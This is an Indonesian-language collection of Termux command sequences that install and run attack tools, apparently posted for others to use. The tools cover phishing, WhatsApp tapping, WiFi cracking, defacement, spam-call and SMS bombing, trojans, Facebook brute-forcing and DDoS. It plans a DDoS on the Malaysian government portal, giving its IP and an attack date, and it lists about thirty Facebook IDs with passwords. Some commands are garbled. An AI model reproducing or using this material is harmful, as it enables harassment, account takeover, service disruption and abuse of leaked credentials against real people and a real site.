Nih sisa sc yang pernah saya pake
Ni lengkap Ini script nya: 
âœ“BOT KOMEN DAN LIKE INSTAGRAM

$ pkg update


$ pkg upgrade

$ pkg install python2

$ pkg install ruby

$ gem install lolcat

2189473808

$git clone https://github.com/Hanzelnutt/instabot

$ cd instabot

$ ls

$ pip2 install -r requirements.txt

$ bash instabot


âœ“PHISING AKUN GMAIL

$apt-get update && apt-get upgrade

$ apt-get install git

$ apt-get install python python-pip python-setuptools

$ pip install scapy

$ git clone https://github.com/wifiphisher/wifiphisher.git

$ cd wifiphisher<

$ python setup.py install

$ cd wifiphisher

$ python wifiphisher


2. EXPLOIT


âœ“SADAP WHATSAPP

$ pkg install git python2

$ git clone 

$ cd HxWhatsapp

$chmod +x HxWhatsApp

$ python2 HxWhatsApp.py


âœ“CONNECT WIFI TANPA PASWORD

$apt update && apt upgrade

$pkg install git

$git clone https://github.com/esc0rtd3w/wifi-hacker

$cd wifi-hacker/

$chmod +x wifi-hacker.sh

$./wifi-hacker.sh


âœ“MELACAK LOKASI

Script ini menggunakan alamat IP untuk melacak koordinat target.

$apt update

$apt upgrade

$pkg install python git

$git clonehttps://github.com/maldevel/IPGeoLocation

$cd IPGeoLocation

$chmod +x ipgeolocation.py

$pip install -r repuirements.txt

$python ipgeolocation.py -m

$python ipgeolocation.py -h

$python ipgeolocation.py -t 10.99.110.220


Ubah alamat IP yang berwarna kuning dengan alamat IP dari orang yang ingin dilacak.

Kemudian copas semua koordinat mulai dari https:// ke browser kalian.

*âœ“DEFACE'


Deface merupakan kata dari bahasa ingris yang artinya merusak, mengotori, mencoreng, dan menghapus. Namun dalam dunia hacker deface adalah kegiatan hacking dengan merubah tampilan suatu website. Baik halaman utama maupun halaman yang terkait dalam suatu url.

$apt update && apt upgrade

$apt install python2 openssl curl libcurl

$pip2 install urllib3 chardet certifi idna requests

$mkdir webdav

$cd webdav

$wget https://pastebin.com/raw/HnVyQPtR

$mv HnVyQPtR webdav.py

$chmod +x webdav.py


âœ“SPAM SMS

$pkg install php curl

$pkg install curl

$curl https://pastebin.com/raw/9BYy1JVc -o jdid.php

$php jdid.php


âœ“SPAM CALL (TOKOPEDIA)

$apt update && apt upgrade

$pkg install php

$pkg install git

$git clone https://github.com/storiku/Call

$cd Call

$php spamcall.php


Lalu masukan no hp korban


âœ“SC TROJAN (TARGET)

$pkg update & pkg upgrade

$pkg install git

$git clone https://github.com/4L13199/meTAInstall

$cd meTAInstall

$chmod +x meTAInstall

$sh meTAInstall.sh

3.TOOL INSTALLER

Tools installer adalah tools yang digunakan untuk menginstal banyak script. Biasanya tools installer dapat menginstal 200-300 script.


âœ“TOOLS SCORPION

$git clone https://github.com/ScorpRx/ScorpRx-Tools

$cd ScorpRx-Tools

$chmod +x ScorpRx-Tools.sh

$sh ScorpRx-Tools.sh


âœ“TOOLS NETHUNTER

$apt update

$apt install git

$git clone https://github.com/Hax4us/Nethunter-In-Termux.git

$cd Nethunter

$chmod +x kalinethunter

$./kalinethunter

$./startkali.sh


âœ“TOOLS LAZYMUX

$pkg update && upgrade

$pkg install python2 git

$git clone https://github.com/Gameye98/LazymuxIni

$cd Lazymux

$chmod +x lazymux.py

$chmod +x lazymux.py


âœ“TOOLS DAIJOBU

$apt upgrade && apt update

$apt install php git

$git clone https://github.com/alintamvanz/diejoubu

$cd diejoubu

$cd v1.2

$php diejoubu.php


âœ“TOOLS B4J1N94N

$git clone https://github.com/DarknessCyberTeam/B4J1N64Nv5k

$cd B4J1N64Nv5

$sh B4J1N64N.sh


*4. DDOS

DDOS attack adalah singkatan dari distributed denial of services yang berfungsi untuk membuat suatu server komputer menjadi tidak bisa dipakai oleh user-nya, dengan menggunakan ribuan system yang menyerang secara bersamaan.


âœ“HAMMER

$pkg update && pkg upgrade

$pkg install python git

$git clone https://github.com/cyweb/hammer

$cd hammer

$python hammer.py

$python hammer.py -s [IP target] -p [PORT] -t 135


âœ“LUCINTA DDOS

$ apt update && napt upgrade

$ apt install python

$ apt install git

$ git clone https://github.com/zlucifer/lucita_ddos

$ cd lucita_ddos

$ chmod +x pukul.py

$ python pukul.py


âœ“DDOS TROJAN

$ pkg update && pkg upgrade

$ pkg install python

$ pkg install bash

$ pkg install toilet

$ pkg install lolcat

$ pkg install git

$ git clone https://github.com/MrTamfanX/MrDdos

$ cd MrDdos

$ sh Tamfan-Ddos.sh


âœ“Win 32DDOS ATTACK

$ apt upgrade&&apt update

$ apt install git toilet

$ apt install python

$ apt install python2

$ git clone https://github.com/banghyuu/ddosWD

â€Œ$ cd ddosWD

$ sh Ddos.sh


âˆšXERXES

â€Œ$ apt install git

$ apt install clang

$ git clone https://github.com/zanyarjamal/xerxes

$ ls

$ cd xerxes

$ ls

$ clang xerxes.c -o xerxes

$ ls

$ ./xerxes (nama website) 80


âˆšTORSHAMMER

$ pkg update

$ pkg install git

$ apt install tor

$ pkg install python2

$ git clone https://github.com/dotfighter/torshammer.git

$ ls

$ cd torshammer

$ chmod +x torshammer.oy

$ python2 torshammer.py


âœ“VANESSA ANGGEL DDOS

$ pkg update && pkg upgrade

$ pkg install git

$ pkg install python2

$ git clone https://github.com/MiSetya/VA-DDOS

$ cd VA-DDOS

$ ls

$ chmod +x 80juta.py

$ ls

$ python2 80juta.py


âœ“DDOS BY.BLACKCYC

$pkg install git

$git clone https://github.com/BlackCyberAnonim/B-ATTACKING

$cd B-ATTACKING

$ls

$sh install.Sh


Virtex for Whatsapp


apt update && apt upgrade


apt install git


apt install curl


apt install figlet


apt install ruby


gem install lolcat


git clone https://github.com/muhammadfathul/VIRTEX


cd VIRTEX


chmod +x virtex.sh


sh virtex.sh


âš”TOOLS HACK VIA TERMUXâš”


ğŸ”°TOOLS HACK FB TEMANğŸ”°

Versi Terbaru Cracknya Lbh Cepat


$ apt update && apt upgrade

$ pip2 install --upgrade pip

$ pip2 install requests

$ pip2 install mechanize

$ pkg install git

$ git clone https://github.com/blackcodercrush/hack-facebook-teman

$ cd hack-facebook-teman

$ sh requests.sh

$ python2 hack-fb.py

_______________


ğŸ”°Hack Facebook target ğŸ”°


$ apt update && apt upgrade

$ apt install git

$ apt install python2

$ pip2 install mechanize

$ git clone https://github.com/FR13ND8/BRUTEFORCEnew

$ cd BRUTEFORCEnew

$ sh new.sh

_______________

ğŸ”°Hack igğŸ”°


$ pkg install nano

$ pkg install figletÂ 

$ pkg install python2

$ pip2 install lolcatÂ 

$ pkg install cowsay

$ pkg install git

$ git clone https://github.com/darkcurut08/darkcurut08

$ cd darkcurut08

$ sh Moreno77.sh

_______________


ğŸ”°Hack Facebook TerbaruğŸ”°


$ apt update && apt upgrade

$ pkg ins toilet

$ pkg ins figlet

$ pkg ins ruby

$ pkg ins gem

$ gem ins lolcat

$ pkg ins php

$ pkg ins python2

$ pkg ins git

$ git clone https://github.com/Rusmana-ID/rus,

$ cd rus

$ sh v2.sh


rename: Anak

pw: Bangsa

_______________

ğŸ”°TOOLS SADAPğŸ”°


$ apt update && apt upgrade

$ apt install php git

$ apt install bash

$ git clone https://github.com/MrTamfanX/TamfanFacebook

$ cd TamfanFacebook

$ chmod +x *

$ chmod -R 775 lib

$ sh install.sh

$ sh tamfan.sh

_______________

ğŸ”°DDos Attack WI-FIğŸ”°


$ apt update && apt upgrade

$ apt install python2

$ apt install git

$ $ cd LITEDDOS./wifi-hacker.shYa


Cek:https://ipsaya.com/hostinglokasi.php


$ python2 LITEDDOS.py [IP target] 80 100

                   SC TROJAN


$ apt update && apt upgrade

$ pkg install python2

$ pip2 install mechanize

$ pip2 install request

$ pkg install git

$ git clone https://github.com/R133F/Trojans

$ cd Trojans

$ python2 trojans.py



DDOS WiFi nya masih work


Hack Fb Target New


------------------------------------------


pkg install git

pkg install python2

pip2 install --upgrade pip

pip2 install mechanize

git clone https://github.com/MRA27/FBNEWV2

cd FBNEWV2

python2 MRA27.py

100003191711187



apt update && apt upgrade

apt install php

apt install python2

apt install toilet

apt install git

git clone https://github.com/4L13199/LITESPAM

cd LITESPAM

sh LITESPAM.sh


Oke langsung saja ke penginstalannya..Â 

$ apt update && apt upgrade

$ apt install git

$ apt install php

$ apt install figlet

$ apt install toilet

$ apt install python2

$ pip2 install requests

$ pip2 install termcolor

$ git clone https://github.com/DarknessCyberTeam/BAJINGANv6.git

$ cd BAJINGANv6

$ sh BAJINGAN.sh

Masukkan Username Ini username : BAJINGAN

Masukkan Password Ini password :

Â Gans

Kumpulan Tools By InYourG00D

Izin promosi biar laku eaÂ 

Nuub Numpang LewatÂ 

Silahkan Cek https://github.com/InYourG00D1 Disitu Ada Tools Bermanfaat :V

Work gk? lu cobain ajaÂ 


Ã·Kumpulan Kode Unik fbÃ·

$ pkg install update && pkg install upgrade

$ apt install toilet

$ apt install figlet

$ gem install lolcat

$ pkg install git

$ git clone https://github.com/InYourG00D1/Unix

$ cd Unix

$ sh KD-FB.sh


Ã·Tools Check BINÃ·

$ pkg install update & pkg install upgrade

$ pkg install git

$ git clone https://github.com/InYourG00D1/check

$ cd check

$ php bin.php


Ã·Tools Spam bomÃ·

ViturÂ 

1.Spam bom Bukalapak

2.Spam bom JD-ID

3.Spam Bom PHD

4.Spam Bom Tokoped

5.Spam Bom Hooq

6.Spam Bom KFC

7.Spam bom matahari

_Totur nya _

$ pkg install update && pkg install upgrade

$ pkg install toilet

$ pkg install figlet

$ pkg install lolcat

$ pkg install php

$ pkg install python2

$ gem install lolcat

$ pkg install git

$ git clone https://github.com/InYourG00D1/Spam

$ cd Spam

$ sh ms.sh


Ã·Kuota free Khusus TreeÃ·

$ pkg install update && pkg install upgrade

$ apt install toilet

$ apt install figlet

$ gem install lolcat

$ pkg install git

$ git clone https://github.com/InYourG00D1/KuotaFree

$ cd KuotaFree

$ sh 2.sh


Ã·Pulsa Free work100%Ã·

$ pkg update&&pkg upgrade

$ pkg install toilet

$ gem install lolcat

$ git clone https://github.com/InYourG00D1/PulsaFree

$ ls

$ cd PulsaFree

$ sh Free.sh


Ã·Tools Sc Phising All GameÃ·

Tapi gk semua game juga si :V

$ apt update && apt upgrade

$ apt install figlet

$ apt install toilet

$ gem install lolcat

$ pkg install git

$ git clone https://github.com/InYourG00D1/ScPh1s1ng

$ cd ScPh1s1ng

$ sh 6.sh


Ã·Kumpulan shell & sc pepesÃ·

Kalo Ingin Direcode scnya silahkan

Hak cipta Jangan Dirubah Hargai mereka coding gan

Ngecoding Gk Segampang Dapettin Cinta Kamu

$ pkg install update && pkg install upgrade

$ apt install figlet

$ apt install toilet

$ gem install lolcat

$ pkg install git

$ git clone https://github.com/InYourG00D1/Pepescers

$ cd Pepescers

$ sh MTD.sh


Ã·Tools ngubah Vidmax jadi FlashÃ·

Work 100% dicoba aja gan

$ pkg install update

$ pkg install upgrade

$ apt install php

$ pkg install git

$ git clone https://github.com/InYourG00D1/Flash

$ cd Flash

$ php flash.php


Ã·Tools Nuyul GoPayÃ·

$ pkg install update

$ pkg install upgrade

$ apt install php

$ pkg install git

$ git clone https://github.com/InYourG00D1/Nuyul-GoPay

$ cd Nuyul-GoPay

$ php Go-Pay.php


Ã·Tools Install BkpÃ·

Yg punya Kontol BuKan Lu doang

Bwahaha

Proses Install nya lumayan lama :V Kalo Mau Cepet Cari Ea SonoÂ 

$ apt update && apt upgrade

$ apt install figlet

$ apt install toilet

$ gem install lolcat

$ pkg install git

$ git clone https://github.com/TumbalGanss/ToolsBkp

$ cd ToolsBkp

$ sh Tobat.sh


Ã·Tools InstallerÃ·

200 toolsÂ 

$ apt update && apt upgrade

$ apt install figlet

$ apt install toilet

$ gem install lolcat

$ pkg install git

$ git clone https://github.com/InYourG00D1/InstallPlerN2

$ cd InstallPlerN2

$ sh InstallPlerV2.sh


Ã·Tools Script Phising AllÃ· game,FB,Instagram

$ apt update && apt upgrade

$ apt install figlet

$ apt install toilet

$ gem install lolcat

$ pkg install git

$ git clone https://github.com/InYourG00D1/scPH1S1N9

$ cd scPH1S1N9

$ sh PhisingV2.sh


#shareMhank

#nomor Yg ada Di Tools Udh Gk Aktif

#Ini New Nomer nya : 0895805133060


https://chat.whatsapp.com/Cj0VpOmWpQBJUEQZqqOLn3


[+] Site Title: MyGOV - The Government of Malaysia's Official Portal

[+] IP address: 150.242.182.57

[+] Web Server: Apache

[+] CMS: Could Not Detect

[+] Cloudflare: Not Detected

[+] Robots File: Could NOT Find robots.txt!


TARGET IP=150.242.182.57


PORT:80



TARGET WEB=malaysia.gov.my



HARI INI 16-APRIL-2019

JAM 15.00 WIB



TOOL ATTACK?


-=NEW TOOL=-

=================

Win32 attack

=================

apt install git

apt install python

apt install bash

apt install toilet

apt install lolcat

git clone https://github.com/BPCATTACKER/DOS-TOOKITS

cd DOS-TOOKITS

sh DoS-TOOKIT.sh


APA YG BARU?

-PERBAIKAN ERROR SAAT MENGIRIM PACKET ATTACK

-DLL


================

DDOS BPC

http://github.com/BLACK-PHANTOM-CYBER/DDOS-BPC/

cd DDOS-BPC

python2 SPOONDDOS.sh

===================

Ingat sebelum attack harus cek ip dulu karena ip bisa berubah-ubah

Dgn cara

Ketik di termux


ping malaysia.gov.my


Salam NASIONAL CYBER ASOSSIATIONÂ 


LEBIH BAIK MENCOBA DAN GAGAL

DARI PD TIDAK MENCOBA SAMA SEKALI



YG SEBAR GW DOAIN DAPAT PAHALA DAPAT PAHALA


Spam Call Unlimited

$ pkg update && pkg upgrade

$ pkg install php

$ pkg install git

$ git clone https://github.com/Aditya021/SpamCall

$ cd SpamSms

$ php SpamCall.php

Masukan No Target ===>

Mode Banyak (y/n) ===> UNTUK Spam Lebih Dari 1

JumlahSpam ===> Masukan Jumlah yang ingin dispamğŸ™ğŸ™ğŸ™ğŸ­ğŸ­ğŸ‡²ğŸ‡¨


Siapa tau ada yang mau nih sc

Cara install tool Mr.Rv1.1

$apt update && apt upgrade

$pkg install git

$pkg install gem

$pkg install figlet

$gem install lolcat

$git clone https://github.com/Mr-R225/Mr.Rv1.1

$cd Mr.Rv1.1

$sh Mr.Rv1.1.sh


tool install

$ apt update && apt upgrade

$ apt install git

$ git clone https://github.com/aryanrtm/4wsectools

cd 4wsectools

chmod 777 tools

./tools


TOOL FSOCIETY

$ git clone https://github.com/manisso/fsociety

$ cd fsociety

$ ./install.sh

$ ls

$ python2 fsociety.py


Assalamualaikum wr.wb

Ni gw bagi SC DARK-FB(VIP-VPRO)

&

Gw bagi2 akun FB untuk kalianÂ 


Ni scripst HACK FB NEWWÂ 

(VIP.VPRO) NO LISENSI

âˆâˆâˆâ‰ BY MR.M4RCH3LLâ‰ âˆâˆâˆ


$ pkg update && pkg upgrade

$ pkg install git

$ pkg install python2

$ pkg install mechanize

$ pkg install request

$ git clone https://github.com/m4rche3ll-cyber/dark-vpro

$ cd dark-vpro

$ python2 dark-vpro.py


NI akun FB untuk kalian smua


[OKâœ“] 100037694627558 | Syla12345

[âœ“] 100037988325303 | Feri123

[âœ“] 100037977879771 | Rifaa123Â 

[OKâœ“] 100037091885666 | Sutris12345

[OKâœ“] 100037229983265 | Kahfi123Â 

[OKâœ“] 100037166443432 | Munir123

[OKâœ“] 100037216997895 Nawawi123

[OKâœ“] 100037665398302 | Ponatim123

[OKâœ“] 100037974392506 | Andri123

[OKâœ“] 100037679447951 | Andika123

[âœ“] 100037946790741 | Sutres123

[âœ“] 100038002561349 | Aghni123

[âœ“] 100038113410131 | Blaster123

[âœ“] 100037710525968 | Noffal123

[âœ“] 100037988325303 | Feri123

[âœ“] 100037590739244 | Agus123

[âœ“] 100037576672206 | Kenyot123

[âœ“] 100037974392506 | Andri123

[OKâœ“] 100037714800465 | Dafa123

[OKâœ“] 100037869518631 | Ervan123

[OKâœ“] 100037354215333 Tans12345

[OKâœ“] 100037553282746 | Rifal123

[OKâœ“] 100037114456712 | Afif12345

[OKâœ“] 100037388647024 | Doni123

OKâœ“] 100037155800753 | Ikna123

[OKâœ“] 100037360233177 | Udin123

[OKâœ“] 100037089379481 | Dafa123

[OKâœ“] 100037388887005 Ridwan123

OKâœ“] 100037199269083 | Rifki123

[OKâœ“] 100037446305432 | Bima123


Gunakan dengan bijak !!!


Kalau kalian ingin tanya lebih / ada masalah

Kalian bisa wa sayaÂ 

No wa ADA DI SC NYA/ komen di bawah


Jangan lupa SUBSCRIBE (FREE) ,agar channel ini berkembang ,,& juga we akan membuat sc2 yang bermanfaat bagi kalian semuaÂ 


Link grup wa : https://chat.whatsapp.com/KxTHh6xi9OgEEl41UDURE9


Oke , terimakasih:)


Wassalamu'alaikum wr.wb




Aldaynoobz


Selasa, 23 April 2019


Script-Termux


Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  We are anonymous

Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â We are legion

Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â We do not forgive

Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  We do not forget

Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Expect us



ï¿¼





DDOS ATTACK (TROJAN)


$ apt install git

$ apt install python

$ apt install bash

$ apt install toilet

$ apt install lolcat

$ git clone https://github.com/BPCATTACKER/DOS-TOOKITS

$ cd DOS-TOOKITS

$ sh DoS-TOOKIT.sh


pilih no 1 lalu enter, lalu masukkan ip target dan enter attack sedang berjalan!


DDOS ATTACK


$Â  pkg update

$Â  pkg upgrade

$Â  pkg install python

$Â  pkg install git

$Â  git clone https://github.com/cyweb/hammer



$Â  cd hammer

$Â  python hammer.py

$Â  python3 hammer.py(103.209.7.113) -p 80 -t 135



BOBOL-WIFI( root)


$ apt update && apt upgrade

$ pkg install git

$ git clone https://github.com/esc0rtd3w/wifi-hacker

$ cd wifi-hacker/

$ chmod +x wifi-hacker.sh

$ ./wifi-hacker.sh



HACK CCTV

$ pkg updateÂ 

$ pkg upgrade -yÂ 

$ pkg install python2 $ pkg install gitÂ 

$ git clone https://github.com/GUNAWAN18ID/cctv.gitÂ 

$ pip2 install requestsÂ 

$ cd cctvÂ 

$ python2 scanner.py



SPAM CALLÂ 


$ pkg update

$ pkg upgrade

$ pkg install git

$ pkg install python2

$ git clone https://github.com/MRRUXHANTAC270/RUXH4N_SPAM

$ cd RUXH4N_SPAM

$ python2 RUXH4N_SP4M.py8


Pilih nomor target jangan lupa pake (+62) ===>> +6285xxxxx

Pilih jumlah spam ====>>>misal:100

Done :v


DEFACE WEBDAV


$Â  pkg update && pkg upgrade

$Â  pkg install bash

$Â  pkg install git

$Â  pip2 install termocolor

$Â  pip2 install lolcat

$Â  git clone https://github.com/MRRUXHANTAC270/Deface-W3BD4F

$Â  cd Deface-W3BD4F

$Â  sh Webdav.sh


Masukan script html





Lalu pilih web vulnya >:)


Â  Â  Â  Â  Â  Â  Â  Â  CekÂ 

Â  Â  Â  Â  Â  Â  Â ğŸ‘‡ğŸ»ğŸ‘‡ğŸ»ğŸ‘‡ğŸ»


$apt install python2

$apt install git

$apt install php

$apt install bash

$apt install nano

$apt install toilet

$git clone https://github.com/MRRUXHANTAC270/cek

$cd cek

$ls

$sh cek.sh


HACK FACEBOOK TARGET


$pkg update && pkg upgrade

$pkg install python2

$pkg install git

$git clone https://github.com/MRRUXHANTAC270/Facebook-target

$cd Facebook-target

$python2 fb.py


SILAHKAN DOWNLOAD WORD LIST NYA TERLEBIH DAHULU

https://sfile.mobi/4UugtYlifYk


Masukin id target ...Â 

Lalu klik /sdcard/password.txt


SCRIPT DEFACE


$apt update && apt upgrade

$apt install python2

$apt install git

$apt install php

$apt install bash

$apt install nano

$apt install toilet

$git clone

https://github.com/MRRUXHANTAC270/scriptdeface

$Â  cd scriptdeface

$Â  python2 now.py


SPAM WHATSAPP


$Â  apt update && apt upgrade

$Â  apt install python2

$Â  apt install git

$Â  apt install php

$Â  apt install bash

$Â  git clone https://github.com/MRRUXHANTAC270/sp4m

$Â  cd sp4m

$Â  php wa.php



Memper Cantik/Melihat V.Android Termux

$ pkg update && pkg upgrad/////+//

$ pkg install neofetch

$ pkg install nano

$ gem install lolcatÂ 

$ cd ../usr/etc

$ nano bash.bashrc

cowsay -f eyes Cyber | lolcat

toilet -f standard Indonesia -F gay

neofetch

date | lolcat

âœ“

Hack FB rombongan

$ apt update && apt upgrade

$ pkg install python2 git

$ pip2 install mechanize

$ git clone http://github.com/pirmansx/mbf

$ ls

$ cd mbf

$ python2 MBF.py

âœ“

Hack FB ngincer

$ apt update ( Enter )

$ apt upgrade ( Enter )

$ apt install python2 ( Enter )

$ pip2 install urllib3 chardet certifi idna requests ( Enter )

$ apt install openssl curl ( Enter )

$ pkg install libcurl ( Enter )

$ ln /sdcard ( Enter )Â 

$ cd /sdcard ( Enter )

$ python2 fbbrute.py ( Enter )

âœ“

Hack Gmail

$ apt-get update && apt-get upgrade

$ apt-get install git

$ apt-get install python python-pip python-setuptools

$ pip install scapy

$ git clone https://github.com/wifiphisher/wifiphisher.git

$ cd wifiphisher<

$ python setup.py install

$ cd wifiphisher

$ python wifiphisher


Nih yang mau hack WiFi Khusus root

$apt update

$apt upgrade

$apt install git

$git clone https://github.com/esc0rtd3w/wifi-hackerhttps://github.com/esc0rtd3w/wifi-hacker

$ls

$cd wifi-hacker

$ls

$chmod +x wifi-hacker.sh

$ls

$./wifi-hacker.sh


cara uninstall tool termuxÂ 

rm -rf toolsnya



Bermain moon-buggy

$ pkg install moon-buggy

$ moon-buggy


CHATTING VIA TERMUX

irssi

/connet irc.freenode.net

/nick w3wandroid

/join #modol



$ pkg install irssi

$ irssi

$ /connect chat.freenode.net

$ /nick 1235

12345 di ganti sesuai nama/nick agan

$ /join #XCAteam



PERKIRAAN cuaca

curl http://wttr.in/ (lokasi)Â 



Browsing di termux

$ pkg install w3m

$ w3m www.google.com

Linknya bsa diubah